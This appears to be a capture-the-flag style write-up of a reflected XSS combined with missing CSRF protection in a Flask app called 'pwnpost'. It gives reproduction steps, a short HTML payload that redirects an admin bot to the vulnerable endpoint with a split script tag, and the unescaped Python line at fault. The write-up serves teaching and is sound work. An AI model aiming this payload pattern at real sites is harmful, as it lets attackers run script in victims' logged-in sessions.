## Description
The "pwnpost" Flask application has a reflected XSS vulnerability in the `/ephemeral` endpoint. Because the application lacks CSRF protection, an attacker can force an authenticated admin bot to visit a malicious page, which then redirects the bot to the vulnerable endpoint and executes arbitrary JavaScript.

## Reproduction Steps
1. Start the vulnerable server: `./challenge/server &`
2. Start the attacker server: `python3 -m http.server 1337`
3. Place `index.html` in the attacker server root.
4. Submit `http://hacker.localhost:1337` to the admin bot.
5. The bot logs in, visits the page, and the XSS triggers `alert("PWNED")`.

## Payload (`index.html`)
```html
<script>
    var payload = '<scr' + 'ipt>alert("PWNED")</scr' + 'ipt>';
    window.location.href = 'http://challenge.localhost/ephemeral?msg=' + encodeURIComponent(payload);
</script>
```

## Root Cause

The vulnerability is a combination of two flaws:

1. **Reflected XSS in `/ephemeral`:** The endpoint takes the `msg` parameter from the URL and injects it directly into the HTML response without any sanitization or escaping.
   ```python
   The message: {flask.request.args.get("msg", "(none)")}
   ```
2. **Lack of CSRF Protection:**: The application does not validate the Origin or Referer headers, nor does it use CSRF tokens. This allows an attacker to force an authenticated user (the admin bot) to make requests to the vulnerable endpoint.

Because the admin bot is already authenticated and carries the auth cookie, any JavaScript executed on the page will run in the context of the admin session.


